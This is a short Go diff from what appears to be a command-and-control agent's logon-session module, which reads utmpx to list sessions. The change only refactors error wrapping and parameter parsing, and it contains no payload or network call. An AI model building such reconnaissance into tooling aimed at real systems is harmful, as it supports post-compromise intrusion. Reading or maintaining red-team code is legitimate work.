@@ -105,7 +105,7 @@ func extractCString(data []byte) string {
 func parseUtmpxForLogonSessions() ([]utmpxEntry, error) {
 	data, err := os.ReadFile(logonSessionsUtmpxPath)
 	if err != nil {
-		return nil, fmt.Errorf("cannot read utmpx: %v", err)
+		return nil, fmt.Errorf("cannot read utmpx: %w", err)
 	}
 	defer structs.ZeroBytes(data)
 
@@ -134,11 +134,9 @@ func parseUtmpxForLogonSessions() ([]utmpxEntry, error) {
 }
 
 func (c *LogonSessionsCommand) Execute(task structs.Task) structs.CommandResult {
-	var args logonSessionsArgs
-	if task.Params != "" {
-		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Failed to parse parameters: %v", err)
-		}
+	args, parseErr := unmarshalParams[logonSessionsArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	action := strings.ToLower(args.Action)
